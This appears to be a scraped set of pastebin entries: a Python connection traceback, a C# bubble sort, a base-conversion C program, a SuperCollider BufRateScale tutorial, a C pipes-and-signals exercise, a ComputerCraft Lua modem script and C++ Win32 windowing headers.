  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1204, in _create_direct_connection
    transp, proto = await self._wrap_create_connection(
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot_lemmy/venv/lib/python3.11/site-packages/aiohttp/connector.py"", line 1000, in _wrap_create_connection
    raise client_error(req.connection_key, exc) from exc
aiohttp.client_exceptions.ClientConnectorError: Cannot connect to host lemmy.basedcount.com:443 ssl:default [None]
"
xkaUkCk2,SortingNumbers,UrayFenn,C#,Friday 23rd of February 2024 03:26:49 AM CDT,"namespace SortingNumbers
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int minNumber = 1;
            int maxNumber = 20;
            Random random = new Random();
            int[] numbers = new int[15];

            for (int i = 0; i < numbers.Length; i++)
            {
                numbers[i] = random.Next(minNumber, maxNumber);
                Console.Write(numbers[i] + "" "");
            }

            Console.WriteLine();

            for (int i = 0; i < numbers.Length; i++)
            {
                for (int j = 0; j < numbers.Length - 1; j++)
                {
                    if (numbers[j] > numbers[j + 1])
                    {
                        int moreNumber = numbers[j];
                        numbers[j] = numbers[j + 1];
                        numbers[j + 1] = moreNumber;
                    }
                }
            }

            Console.WriteLine();
            Console.WriteLine(String.Join("" "", numbers));
        }
    }
}"
7Ey8R22j,Soccer Prediction Betting Tips 23022024,livebetpro,PHP,Friday 23rd of February 2024 01:43:27 AM CDT,https://www.livebetpro.com/soccer-prediction-betting-tips-23022024/
Yfepk6jy,1108a+b,deezykiki,C,Friday 23rd of February 2024 01:30:21 AM CDT,"#include<stdio.h>
#include<string.h>

long long trans(char* a,int j,int x)//x标记结束累加的位置
{
	int flag = 0;
	int lena = strlen(a);
	long long n = 1,num = 0;
	
	for(int i = lena-1;i >= x;i--)
	{
		if(a[i] >= '0' && a[i] <= '9')
		{
			num = num+(a[i]-'0')*n;
		}
		else if(a[i] >= 'A'&&a[i] <= 'z')
		{
			num = num+(a[i]-'A'+10)*n;
		}
		n = n*j;
	}
	
	return num;
}

int main()
{
	int n;
	scanf(""%d"",&n);
	while(n--)
	{
		char a[50],b[50];
		int aj,bj;
		long long at,bt;
		scanf(""%s %d %s %d"",&a,&aj,&b,&bj);
		//处理负数
		if(a[0] == '-') at = 0-trans(a,aj,1);
		else at = trans(a,aj,0);
		if(b[0] == '-') bt = 0-trans(b,bj,1);
		else bt = trans(b,bj,0);
		printf(""%I64d\n"",at+bt);
	}
}"
mDuJAe3n,BufRateScale UGen,SoundEngraver,SuperCollider,Friday 23rd of February 2024 01:14:32 AM CDT,"//////////////////////////  BufRateScale UGen //////////////////////////

s.boot;

s.meter;
s.scope;
s.plotTree;

s.reboot;
s.quit;

// Remember this UGen when working with audio files in SuperCollider!

// Drum Loop

~drums = Buffer.read(s, ""insertaudiofilehere"");


~drums.play;

~drums.duration; // If you would like to see the sound file's duration.
~drums.numChannels; // If you would like to see how many channels it is.

~drums.sampleRate; // Great way to see your audio file's sample rate.




//////////// Drum Loop ////////////

// Old bad code...
// My drum loop is running at a sample rate of 48k.
// The audio server is running at 44.1k.
// Because of this, you're hearing a slower drum loop (compared to its original speed).


// Try your audio file with the code below...

(
~tortoDrums = SynthDef(\play, {
	arg buf=0, rate=1, spos=0, pan=0, amp=1, out=0;
	var sig;
	sig = PlayBuf.ar(2, buf, rate, spos);
	pan = Pan2.ar(sig, pan, amp);
	Out.ar(out, sig);
}).add;
)

~tortoDrums = Synth(\play, [\buf, ~drums]);
~tortoDrums.free; // Free the synth if you don't have an Env or doneAction value.



// Better code

(
~tortoDrums = SynthDef(\play, {
	arg buf=0, rate=1, spos=0, pan=0, amp=1, out=0;
	var sig;
	sig = PlayBuf.ar(
		2,
		buf,
		BufRateScale.kr(buf) * rate, // edited rate argument
		spos
	);
	pan = Pan2.ar(sig, pan, amp);
	Out.ar(out, sig);
}).add;
)

~tortoDrums = Synth(\play, [\buf, ~drums]); // It plays at its original speed!
~tortoDrums.free; // Free the synth if you don't have an Env or doneAction value.
"
xKtxCbM5,SO,Alx09,C,Friday 23rd of February 2024 01:06:26 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <fcntl.h>
#include <signal.h>

#define MAX_FILENAME_LENGTH 256

int pipefd[2];

void handle_signal(int signal) {
    if (signal == SIGALRM) {
        printf(""Timpul a expirat!\n"");
        close(pipefd[1]);
        exit(EXIT_SUCCESS);
    }
    else if (signal == SIGUSR1) {
        printf(""Procesul P a primit semnal pentru stergerea fisierului.\n"");
    }
}

void process_file(char *filename) {
    int fd;
    struct stat file_stat;
    char buffer[MAX_FILENAME_LENGTH];
    fd = open(filename, O_RDONLY);
    if (fd == -1) {
        perror(""Eroare la deschiderea fisierului"");
        return;
    }
    fstat(fd, &file_stat);
    read(fd, buffer, MAX_FILENAME_LENGTH);
    printf(""Nume fisier: %s, Dimensiune: %ld bytes\n"", buffer, file_stat.st_size);
    close(fd);
    unlink(filename);
}

void process_directory(char *dirname, int interval) {
    DIR *dir;
    struct dirent *entry;
    struct stat file_stat;
    int pid;
    if ((pid = fork()) == -1) {
        perror(""Eroare la fork"");
        exit(EXIT_FAILURE);
    }
    else if (pid == 0) {
        close(pipefd[1]);
        dup2(pipefd[0], STDIN_FILENO);
        close(pipefd[0]);
        execl(""./proces_F"", ""proces_F"", NULL);
        perror(""Eroare la executia procesului F"");
        exit(EXIT_FAILURE);
    }
    close(pipefd[0]);
    write(pipefd[1], dirname, strlen(dirname) + 1);
    signal(SIGALRM, handle_signal);
    signal(SIGUSR1, handle_signal);
    alarm(interval);
    dir = opendir(dirname);
    if (dir == NULL) {
        perror(""Eroare la deschiderea directorului"");
        exit(EXIT_FAILURE);
    }
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ""."") == 0 || strcmp(entry->d_name, "".."") == 0)
            continue;
        char filepath[MAX_FILENAME_LENGTH];
        snprintf(filepath, MAX_FILENAME_LENGTH, ""%s/%s"", dirname, entry->d_name);
        if (stat(filepath, &file_stat) == -1) {
            perror(""Eroare la obtinerea informatiilor despre fisier"");
            continue;
        }
        if (S_ISREG(file_stat.st_mode)) {
            write(pipefd[1], entry->d_name, strlen(entry->d_name) + 1);
        }
    }
    closedir(dir);
    wait(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        exit(EXIT_FAILURE);
    }
    if (pipe(pipefd) == -1) {
        perror(""Eroare la crearea pipe-ului"");
        exit(EXIT_FAILURE);
    }
    process_directory(argv[1], atoi(argv[2]));
    return 0;
}
"
XU1nKv5C,Bastion Reciever Fireplace,Alexr360,Lua,Friday 23rd of February 2024 12:06:22 AM CDT,"local function bastion()
	local modem = peripheral.find(""modem"") or error(""No modem attached"", 0)
    modem.open(15) -- Open 43 so we can receive replies

    -- And wait for a reply
    local event, side, channel, replyChannel, message, distance
    repeat
      event, side, channel, replyChannel, message, distance = os.pullEvent(""modem_message"")
    until channel == 15

    -- Process the received message based on its content
    if message == ""Fireplace"" then
        print(""Toggling Fireplace Safe"")
        modem.transmit(43, 15, ""Toggling Fireplace Safe"")
        redstone.setOutput(""front"", true)  -- Emit a redstone signal to the right
        os.sleep(1)  -- Keep the signal for 1 seconds
        redstone.setOutput(""front"", false)  -- Turn off the redstone signal
	end
end

term.clear()
term.setCursorPos(1, 1)
print(""Bastion Network Online!"")

-- Main loop
while true do
    bastion()
end"
qe6JRBY0,kit_win32 as of 2024-02-22 (2/2),Kitomas,C++,Thursday 22nd of February 2024 11:56:46 PM CDT,"/*+include\kit\_misc_time.hpp+*/

#ifndef _KIT_INC__MISC_TIME_HPP
#define _KIT_INC__MISC_TIME_HPP

#include ""commondef.hpp""


namespace kit {


namespace time {




u64 getTicks();
u64 getTicksPerSecond();
f64 getUptime();

void sleep(u32 milliseconds);




};


};

#endif /* _KIT_INC__MISC_TIME_HPP */

/*-include\kit\_misc_time.hpp-*/


/*+include\kit\_video_Bitmap.hpp+*/

#ifndef _KIT_INC__VIDEO_BITMAP_HPP
#define _KIT_INC__VIDEO_BITMAP_HPP

#include ""commondef.hpp""
#include ""_video_misc.hpp""


namespace kit {




struct _BitmapOpaque;




class Bitmap {
  u32 _type;
  u32 _padding32;
  _BitmapOpaque* _opq = nullptr;
  bool _valid = false;


public:
  u32 _getType(){ return _type; }
  _BitmapOpaque* _accessOpaque(){ return _opq; }


  //loads from memory
  Bitmap(const color::ARGB* pixelData,
         u32 width, u32 height,
         bool directAccess = false);

  //loads from file
  Bitmap(const char* fileName,
         u32 width, u32 height,
         bool directAccess = false);

  ~Bitmap();


};




};

#endif /* _KIT_INC__VIDEO_BITMAP_HPP */

/*-include\kit\_video_Bitmap.hpp-*/


/*+include\kit\_video_misc.hpp+*/

#ifndef _KIT_INC__VIDEO_MISC_HPP
#define _KIT_INC__VIDEO_MISC_HPP

#include ""commondef.hpp""


namespace kit {




namespace color {

  //what GDI uses (save for the alpha channel)
  union ARGB { //4B; 0xAARRGGBB
    u32 v; //entire color [v]alue
    struct {
      u8 b;
      u8 g;
      u8 r;
      u8 a;
    };

    ARGB() : v(0) {}
    ARGB(u32 _v) : v(_v) {}
    ARGB(u8 _r, u8 _g,
         u8 _b, u8 _a) : r(_r), g(_g), b(_b), a(_a) {}
    inline void operator=(const u32 cv){ v = cv; }
    inline bool operator==(const ARGB& c){ return (v == c.v); };
    inline bool operator!=(const ARGB& c){ return (v != c.v); };
    inline bool operator==(const u32& cv){ return (v == cv); };
    inline bool operator!=(const u32& cv){ return (v != cv); };
  };


  union ABGR { //4B; 0xAABBGGRR
    u32 v; //entire color [v]alue
    struct {
      u8 r;
      u8 g;
      u8 b;
      u8 a;
    };

    ABGR() : v(0) {}
    ABGR(u32 _v) : v(_v) {}
    ABGR(u8 _r, u8 _g,
         u8 _b, u8 _a) : r(_r), g(_g), b(_b), a(_a) {}
    inline void operator=(const u32 cv){ v = cv; }
    inline bool operator==(const ABGR& c){ return (v == c.v); };
    inline bool operator!=(const ABGR& c){ return (v != c.v); };
    inline bool operator==(const u32& cv){ return (v == cv); };
    inline bool operator!=(const u32& cv){ return (v != cv); };
  };

};




namespace shape {

  struct point { //8B
    s32 x, y;
    point() : x(0), y(0) {}
    point(s32 _x, s32 _y) : x(_x), y(_y) {}
    inline bool operator==(const point& p){ return (x==p.x && y==p.y); };
    inline bool operator!=(const point& p){ return (x!=p.x && y!=p.y); };
  };

  struct rect { //16B
    s32 x, y; //x & y position of the rectangle's top-left corner
    s32 w, h; //the rectangle's width & height
    rect() : x(0), y(0), w(0), h(0) {}
    rect(s32 _x, s32 _y) : x(_x), y(_y) {}
    rect(s32 _x, s32 _y,
         s32 _w, s32 _h) : x(_x), y(_y), w(_w), h(_h) {}
    inline bool operator==(const rect& r){ return (x==r.x && y==r.y && w==r.w && h==r.h); };
    inline bool operator!=(const rect& r){ return (x!=r.x && y!=r.y && w!=r.w && h!=r.h); };
  };

  struct line { //16B
    s32 x0, y0;
    s32 x1, y1;
    line() : x0(0), y0(0), x1(0), y1(0) {}
    line(s32 _x0, s32 _y0,
         s32 _x1, s32 _y1) : x0(_x0), y0(_y0), x1(_x1), y1(_y1) {}
    inline bool operator==(const line& l){ return (x0==l.x0 && y0==l.y0 && x1==l.x1 && y1==l.y1); };
    inline bool operator!=(const line& l){ return (x0!=l.x0 && y0!=l.y0 && x1!=l.x1 && y1!=l.y1); };
  };



  struct fpoint { //8B
    f32 x, y;
    fpoint() : x(0.0f), y(0.0f) {}
    fpoint(f32 _x, f32 _y) : x(_x), y(_y) {}
    inline bool operator==(const fpoint& p){ return (x==p.x && y==p.y); };
    inline bool operator!=(const fpoint& p){ return (x!=p.x && y!=p.y); };
  };

  struct frect { //16B
    f32 x, y; //x & y position of rectangle's top-left corner
    f32 w, h; //the rectangle's width & height
    frect() : x(0.0f), y(0.0f), w(0.0f), h(0.0f) {}
    frect(f32 _x, f32 _y) : x(_x), y(_y) {}
    frect(f32 _x, f32 _y,
          f32 _w, f32 _h) : x(_x), y(_y), w(_w), h(_h) {}
    inline bool operator==(const frect& r){ return (x==r.x && y==r.y && w==r.w && h==r.h); };
    inline bool operator!=(const frect& r){ return (x!=r.x && y!=r.y && w!=r.w && h!=r.h); };
  };

  struct fline { //16B
    f32 x0, y0;
    f32 x1, y1;
    fline() : x0(0.0f), y0(0.0f), x1(0.0f), y1(0.0f) {}
    fline(f32 _x0, f32 _y0,
          f32 _x1, f32 _y1) : x0(_x0), y0(_y0), x1(_x1), y1(_y1) {}
    inline bool operator==(const fline& l){ return (x0==l.x0 && y0==l.y0 && x1==l.x1 && y1==l.y1); };
    inline bool operator!=(const fline& l){ return (x0!=l.x0 && y0!=l.y0 && x1!=l.x1 && y1!=l.y1); };
  };



  struct dpoint { //16B
    f64 x, y;
    dpoint() : x(0.0), y(0.0) {}
    dpoint(f64 _x, f64 _y) : x(_x), y(_y) {}
    inline bool operator==(const dpoint& p){ return (x==p.x && y==p.y); };
    inline bool operator!=(const dpoint& p){ return (x!=p.x && y!=p.y); };
  };

  struct drect { //32B
    f64 x, y; //x & y position of rectangle's top-left corner
    f64 w, h; //the rectangle's width & height
    drect() : x(0.0), y(0.0), w(0.0), h(0.0) {}
    drect(f64 _x, f64 _y) : x(_x), y(_y) {}
    drect(f64 _x, f64 _y,
          f64 _w, f64 _h) : x(_x), y(_y), w(_w), h(_h) {}
    inline bool operator==(const drect& r){ return (x==r.x && y==r.y && w==r.w && h==r.h); };
    inline bool operator!=(const drect& r){ return (x!=r.x && y!=r.y && w!=r.w && h!=r.h); };
  };

  struct dline { //32B
    f64 x0, y0;
    f64 x1, y1;
    dline() : x0(0.0), y0(0.0), x1(0.0), y1(0.0) {}
    dline(f64 _x0, f64 _y0,
          f64 _x1, f64 _y1) : x0(_x0), y0(_y0), x1(_x1), y1(_y1) {}
    inline bool operator==(const dline& l){ return (x0==l.x0 && y0==l.y0 && x1==l.x1 && y1==l.y1); };
    inline bool operator!=(const dline& l){ return (x0!=l.x0 && y0!=l.y0 && x1!=l.x1 && y1!=l.y1); };
  };

};




};

#endif /* _KIT_INC__VIDEO_MISC_HPP */

/*-include\kit\_video_misc.hpp-*/


/*+include\kit\_video_Window.hpp+*/

#ifndef _KIT_INC__VIDEO_WINDOW_HPP
#define _KIT_INC__VIDEO_WINDOW_HPP

#include ""commondef.hpp""
#include ""_video_misc.hpp""
#include ""_video_WindowEvent.hpp""


namespace kit {




enum WindowPositionEnum {
  WINPOS_UNDEFINED = 0xC0000000,
  WINPOS_CENTERED  = 0xC0000001,
  WINPOS_UNCHANGED = 0xC0000002,
};


//(some flags override others!)
enum WindowFlagEnum {
  WINFLAG_HIDDEN        = 0x01, // window is not visible
  WINFLAG_BORDERLESS    = 0x02, // window lacks any decoration
  WINFLAG_RESIZABLE     = 0x04, // window can be resized
  WINFLAG_MINIMIZED     = 0x08, // window is minimized
  WINFLAG_MAXIMIZED     = 0x10, // window is maximized
  WINFLAG_FOCUS         = 0x20, // window has grabbed input focus
  WINFLAG_FULLSCREEN    = 0x40, // window is in fullscreen mode (non-exclusive)
};




struct _WindowOpaque;




class Window {
  u32 _type;
  u32 _padding32;
  _WindowOpaque* _opq = nullptr;
  char _title[256];
  bool _constructing = true;
  bool _valid = false;


public:
  u32 _getType(){ return _type; }
  _WindowOpaque* _accessOpaque(){ return _opq; }; //don't touch this, seriously


  Window(const char* windowTitle,
         u32 windowWidth, u32 windowHeight,
         u32 windowFlags = 0,
         s32 windowX = WINPOS_UNDEFINED,
         s32 windowY = WINPOS_UNDEFINED,
         u32 canvasWidth = 0, u32 canvasHeight = 0,
         bool directAccess = false);

  ~Window();


  bool isConstructing(){ return _constructing; }
  bool isValid(){ return _valid; }
  bool isClosed();

  const char* getTitle(){ return _title; }
  shape::rect  getWindowRect();
  shape::point getCanvasSize();
  color::ARGB* getPixels();

  void setWindowRect(shape::rect* newRect);
  void setVisibility(bool showWindow = true);
  void setFocus(bool enable = true);
  void setFullscreen(bool enable);

  bool pollEvent(WindowEvent* event_p = nullptr);

  void lock(bool locked = true);
  void unlock(){ lock(false); }

  void present();
  void clear(color::ARGB color = 0x00000000);
};




};

#endif /* _KIT__VIDEO_WINDOW_HPP */

/*-include\kit\_video_Window.hpp-*/


/*+include\kit\_video_WindowEvent.hpp+*/

#ifndef _KIT_INC__VIDEO_WINDOWEVENT_HPP
#define _KIT_INC__VIDEO_WINDOWEVENT_HPP

#include ""commondef.hpp""


namespace kit {




#define KIT_EVENT_ID(_id) ( (_id) & 0xffff0000 )
#define KIT_SUBEVENT_ID(_id) ( (_id) & 0xffff )

enum WindowEventEnum {
  WINEVENT_NULL           = 0x00000000,

  WINEVENT_COMMON         = 0x00010000, //WindowEvent_Common

  WINEVENT_WIN            = 0x00020000, //WindowEvent_Win
  WINEVENT_WIN_CLOSE      = WINEVENT_WIN   | 0x0001,
  WINEVENT_WIN_MOVED      = WINEVENT_WIN   | 0x0002,
  WINEVENT_WIN_RESIZED    = WINEVENT_WIN   | 0x0003,
  WINEVENT_WIN_UNFOCUSING = WINEVENT_WIN   | 0x0004,
  WINEVENT_WIN_FOCUSED    = WINEVENT_WIN   | 0x0005,

  WINEVENT_KEY            = 0x00030000, //WindowEvent_Key
  WINEVENT_KEY_CHAR       = WINEVENT_KEY   | 0x0001,
  WINEVENT_KEY_UP         = WINEVENT_KEY   | 0x0002,
  WINEVENT_KEY_DOWN       = WINEVENT_KEY   | 0x0003,

  WINEVENT_MOUSE          = 0x00040000, //WindowEvent_Mouse
  WINEVENT_MOUSE_MOVE     = WINEVENT_MOUSE | 0x0001,
  WINEVENT_MOUSE_LEAVE    = WINEVENT_MOUSE | 0x0002, //(not fully implemented)
  WINEVENT_MOUSE_ENTER    = WINEVENT_MOUSE | 0x0003, //(not fully implemented)
  WINEVENT_MOUSE_UP       = WINEVENT_MOUSE | 0x0004,
  WINEVENT_MOUSE_DOWN     = WINEVENT_MOUSE | 0x0005,
  WINEVENT_MOUSE_HWHEEL   = WINEVENT_MOUSE | 0x0006,
  WINEVENT_MOUSE_VWHEEL   = WINEVENT_MOUSE | 0x0007,
};



/*+WINEVENT_COMMON+*/

struct WindowEvent_Common { //16B
  u32 type;
  u32 winIndex;
  u64 timestamp;
};

/*-WINEVENT_COMMON-*/



/*+WINEVENT_WIN+*/

struct WindowEvent_Win { //24B
  u32 type;
  u32 winIndex;
  u64 timestamp;
  union { s32 data1, dataX; };
  union { s32 data2, dataY; };
};

/*-WINEVENT_WIN-*/



/*+WINEVENT_KEY+*/

enum WindowEvent_Key_ModifierEnum {
  KMOD_NONE      = 0x0000,
  KMOD_LSHIFT    = 0x0001,
  KMOD_RSHIFT    = 0x0002,
  KMOD_LCTRL     = 0x0004,
  KMOD_RCTRL     = 0x0008,
  KMOD_LALT      = 0x0010,
  KMOD_RALT      = 0x0020,
  KMOD_LGUI      = 0x0040, //windows key?
  KMOD_RGUI      = 0x0080,  //
    KMOD_LWIN    = KMOD_LGUI,
    KMOD_RWIN    = KMOD_RGUI,
  KMOD_NUMLOCK   = 0x1000,
  KMOD_CAPSLOCK  = 0x2000,
  KMOD_ALTGRAPH  = 0x4000,
  KMOD_SCROLLOCK = 0x8000,
  KMOD_CTRL      = ( KMOD_LCTRL  | KMOD_RCTRL  ),
  KMOD_SHIFT     = ( KMOD_LSHIFT | KMOD_RSHIFT ),
  KMOD_ALT       = ( KMOD_LALT   | KMOD_RALT   ),
  KMOD_GUI       = ( KMOD_LGUI   | KMOD_RGUI   ),
  KMOD_WIN       = ( KMOD_LWIN   | KMOD_RWIN   ),
};

enum WindowEvent_Key_PhysicalEnum {
  //tbd
};

enum WindowEvent_Key_VirtualEnum {
  //(misc. mouse)       = 0x01 -> 0x06
  //(reserved)          = 0x07,
  VKEY_BACK             = 0x08, //backspace key
    VKEY_BACKSPACE      = VKEY_BACK,
  VKEY_TAB              = 0x09,
  //(reserved)          = 0x0A -> 0x0B,
  VKEY_CLEAR            = 0x0C,
  VKEY_RETURN           = 0x0D, //enter key
    VKEY_ENTER          = VKEY_RETURN,
  //(unassigned)        = 0x0E -> 0x0F,
  VKEY_SHIFT            = 0x10,
  VKEY_CONTROL          = 0x11, //ctrl key
    VKEY_CTRL           = VKEY_CONTROL,
  VKEY_MENU             = 0x12, //alt key
    VKEY_ALT            = VKEY_MENU,
  VKEY_PAUSE            = 0x13,
  VKEY_CAPITAL          = 0x14, //caps lock key
    VKEY_CAPSLOCK       = VKEY_CAPITAL,
  //(IME stuff)         = 0x15 -> 0x1A,
  VKEY_ESCAPE           = 0x1B, //esc key
  //(IME stuff)         = 0x1C -> 0x1F,
  VKEY_SPACE            = 0x20, //space bar key
  VKEY_PRIOR            = 0x21, //page up key
    VKEY_PGUP           = VKEY_PRIOR,
  VKEY_NEXT             = 0x22, //page down key
    VKEY_PGDN           = VKEY_NEXT,
  VKEY_END              = 0x23,
  VKEY_HOME             = 0x24,
  VKEY_LEFT             = 0x25, //left arrow key
  VKEY_UP               = 0x26, //up arrow key
  VKEY_RIGHT            = 0x27, //right arrow key
  VKEY_DOWN             = 0x28, //down arrow key
  VKEY_SELECT           = 0x29,
  VKEY_PRINT            = 0x2A,
  VKEY_EXECUTE          = 0x2B,
  VKEY_SNAPSHOT         = 0x2C, //print screen key
    VKEY_PRTSC          = VKEY_SNAPSHOT,
  VKEY_INSERT           = 0x2D, //ins key
  VKEY_DELETE           = 0x2E, //del key
  VKEY_HELP             = 0x2F, //help key
  VKEY_0                = 0x30, //'0'
  VKEY_1                = 0x31, //'1'
  VKEY_2                = 0x32, //'2'
  VKEY_3                = 0x33, //'3'
  VKEY_4                = 0x34, //'4'
  VKEY_5                = 0x35, //'5'
  VKEY_6                = 0x36, //'6'
  VKEY_7                = 0x37, //'7'
  VKEY_8                = 0x38, //'8'
  VKEY_9                = 0x39, //'9'
  //(undefined)         = 0x3A -> 0x40,
  VKEY_A                = 0x41, //'A'
  VKEY_B                = 0x42, //'B'
  VKEY_C                = 0x43, //'C'
  VKEY_D                = 0x44, //'D'
  VKEY_E                = 0x45, //'E'
  VKEY_F                = 0x46, //'F'
  VKEY_G                = 0x47, //'G'
  VKEY_H                = 0x48, //'H'
  VKEY_I                = 0x49, //'I'
  VKEY_J                = 0x4A, //'J'
  VKEY_K                = 0x4B, //'K'
  VKEY_L                = 0x4C, //'L'
  VKEY_M                = 0x4D, //'M'
  VKEY_N                = 0x4E, //'N'
  VKEY_O                = 0x4F, //'O'
  VKEY_P                = 0x50, //'P'
  VKEY_Q                = 0x51, //'Q'
  VKEY_R                = 0x52, //'R'
  VKEY_S                = 0x53, //'S'
  VKEY_T                = 0x54, //'T'
  VKEY_U                = 0x55, //'U'
  VKEY_V                = 0x56, //'V'
  VKEY_W                = 0x57, //'W'
  VKEY_X                = 0x58, //'X'
  VKEY_Y                = 0x59, //'Y'
  VKEY_Z                = 0x5A, //'Z'
  VKEY_LWIN             = 0x5B, //left windows key
  VKEY_RWIN             = 0x5C, //right windows key
  VKEY_APPS             = 0x5D, //applications key
  //(reserved)          = 0x5E,
  VKEY_SLEEP            = 0x5F, //computer sleep key
  VKEY_NUMPAD0          = 0x60,
  VKEY_NUMPAD1          = 0x61,
  VKEY_NUMPAD2          = 0x62,
  VKEY_NUMPAD3          = 0x63,
  VKEY_NUMPAD4          = 0x64,
  VKEY_NUMPAD5          = 0x65,
  VKEY_NUMPAD6          = 0x66,
  VKEY_NUMPAD7          = 0x67,
  VKEY_NUMPAD8          = 0x68,
  VKEY_NUMPAD9          = 0x69,
  VKEY_MULTIPLY         = 0x6A, //numpad '*'
  VKEY_ADD              = 0x6B, //numpad '+'
  VKEY_SEPARATOR        = 0x6C, //numpad enter
  VKEY_SUBTRACT         = 0x6D, //numpad '-'
  VKEY_DECIMAL          = 0x6E, //numpad '.'
  VKEY_DIVIDE           = 0x6F, //numpad '/'
  VKEY_F1               = 0x70,
  VKEY_F2               = 0x71,
  VKEY_F3               = 0x72,
  VKEY_F4               = 0x73,
  VKEY_F5               = 0x74,
  VKEY_F6               = 0x75,
  VKEY_F7               = 0x76,
  VKEY_F8               = 0x77,
  VKEY_F9               = 0x78,
  VKEY_F10              = 0x79,
  VKEY_F11              = 0x7A,
  VKEY_F12              = 0x7B,
  VKEY_F13              = 0x7C,
  VKEY_F14              = 0x7D,
  VKEY_F15              = 0x7E,
  VKEY_F16              = 0x7F,
  VKEY_F17              = 0x80,
  VKEY_F18              = 0x81,
  VKEY_F19              = 0x82,
  VKEY_F20              = 0x83,
  VKEY_F21              = 0x84,
  VKEY_F22              = 0x85,
  VKEY_F23              = 0x86,
  VKEY_F24              = 0x87,
  //(reserved)          = 0x88 -> 0x8F,
  VKEY_NUMLOCK          = 0x90,
  VKEY_SCROLL           = 0x91, //scroll lock key
    VKEY_SCROLLOCK      = VKEY_SCROLL,
  //(OEM-specific)      = 0x92 -> 0x96,
  //(unassigned)        = 0x97 -> 0x9F,
  //(l/r key variants)  = 0xA0 -> 0xA5,
  //(browser keys)      = 0xA6 -> 0xAC,
  VKEY_VOLUME_MUTE      = 0xAD,
  VKEY_VOLUME_DOWN      = 0xAE,
  VKEY_VOLUME_UP        = 0xAF,
  VKEY_MEDIA_NEXT_TRACK = 0xB0,
  VKEY_MEDIA_PREV_TRACK = 0xB1,
  VKEY_MEDIA_STOP       = 0xB2,
  VKEY_MEDIA_PLAY_PAUSE = 0xB3, //Play/Pause Media key
  //(launch keys)       = 0xB4 -> 0xB7,
  //(reserved)          = 0xB8 -> 0xB9,
  VKEY_OEM_1            = 0xBA, //misc. chars; varies by keyboard (';',':' on US standard)
    VKEY_SEMICOLON      = VKEY_OEM_1,
  VKEY_OEM_PLUS         = 0xBB, //'+' in any country/region
    VKEY_PLUS           = VKEY_OEM_PLUS,
  VKEY_OEM_COMMA        = 0xBC, //',' in any country/region
    VKEY_COMMA          = VKEY_OEM_COMMA,
  VKEY_OEM_MINUS        = 0xBD, //'-' in any country/region
    VKEY_MINUS          = VKEY_OEM_MINUS,
  VKEY_OEM_PERIOD       = 0xBE, //'.' in any country/region
    VKEY_PERIOD         = VKEY_OEM_PERIOD,
  VKEY_OEM_2            = 0xBF, //misc. chars; varies by keyboard ('/','?' on US standard)
    VKEY_FSLASH         = VKEY_OEM_2,
  VKEY_OEM_3            = 0xC0, //misc. chars; varies by keyboard ('`','~' on US standard)
    VKEY_BACKTICK       = VKEY_OEM_3,
  //(reserved)          = 0xC1 -> 0xDA,
  VKEY_OEM_4            = 0xDB, //misc. chars; varies by keyboard ('[','{' on US standard)
    VKEY_LBRACKET       = VKEY_OEM_4,
  VKEY_OEM_5            = 0xDC, //misc. chars; varies by keyboard ('\\','|' on US standard)
    VKEY_BSLASH         = VKEY_OEM_5,
  VKEY_OEM_6            = 0xDD, //misc. chars; varies by keyboard (']','}' on US standard)
    VKEY_RBRACKET       = VKEY_OEM_6,
  VKEY_OEM_7            = 0xDE, //misc. chars; varies by keyboard ('\'','\""' on US standard)
    VKEY_APOSTROPHE     = VKEY_OEM_7,
  VKEY_OEM_8            = 0xDF, //misc. chars; varies by keyboard
  //(reserved)          = 0xE0,
  //(misc.)             = 0xE1 -> 0xE7,
  //(unassigned)        = 0xE8,
  //(misc.)             = 0xE9 -> 0xFE,
};


union WindowEvent_Key_Mod { //2B
  struct {
    u16 lshift    : 1;
    u16 rshift    : 1;
    u16 lctrl     : 1;
    u16 rctrl     : 1;
    u16 lalt      : 1;
    u16 ralt      : 1;
    u16 lgui      : 1;
    u16 rgui      : 1;
    u16 _unused   : 4;
    u16 numlock   : 1;
    u16 capslock  : 1;
    u16 altgraph  : 1;
    u16 scrollock : 1;
  };
  u16 all;
};

struct WindowEvent_Key_Sym { //8B
  union {
    WindowEvent_Key_Mod kmod;
    u16  kmods;
  };
  u8  _unused;
  u8   pkey; //physical key code (named .scancode in SDL's Keysym struct)
  u8   vkey; //virtual key code (named .sym in SDL's Keysym struct)
  bool pressed;
  bool ischar; //'is event KEY_CHAR?', otherwise it's KEY_UP or KEY_DOWN
  bool repeat;
};

struct WindowEvent_Key { //24B
  u32 type;
  u32 winIndex;
  u64 timestamp;
  union {
    struct { //(basically a copy of WindowEvent_Key_Sym)
      u16  kmods;
      u8  _unused;
      u8   pkey;
      u8   vkey;
      bool pressed;
      bool ischar;
      bool repeat;
    };
    WindowEvent_Key_Sym sym;
  };
};

/*-WINEVENT_KEY-*/



/*+WINEVENT_MOUSE+*/

//how many steps between mouse wheel notches
#define KIT_MOUSE_WHEEL_DELTA (120)


enum WindowEvent_Mouse_ButtonEnum {
  MBUTTON_LEFT   = 0x01,
  MBUTTON_MIDDLE = 0x02,
  MBUTTON_RIGHT  = 0x04,
  MBUTTON_X1     = 0x08,
  MBUTTON_X2     = 0x10,
};


struct WindowEvent_Mouse { //40B
  u32  type;
  u32  winIndex;
  u64  timestamp;
  s32  x;  //coordinates relative to window
  s32  y;   //^^
  s32  dx; //delta x (coordinates relative to last recorded x position)
  s32  dy; //delta y (coordinates relative to last recorded y position)
  s32  data; //currently used to store the value of wheel events before delta is applied
  u8  _unused;
  u8   button;   //flags for currently pressed buttons (WindowEvent_Mouse_ButtonEnum)
  bool pressed;  //will be true if button is nonzero
  bool dblClick; //'is double click?'
};

/*-WINEVENT_MOUSE-*/



union WindowEvent { //<whatever the largest event is>B
  u32                type;
  WindowEvent_Common common;
  WindowEvent_Win    win;
  WindowEvent_Key    key;
  WindowEvent_Mouse  mouse;
  WindowEvent() : type(WINEVENT_NULL) {}
};




};

#endif /* _KIT_INC__VIDEO_WINDOWEVENT_HPP */

/*-include\kit\_video_WindowEvent.hpp-*/


/*+include\kit\all.hpp+*/

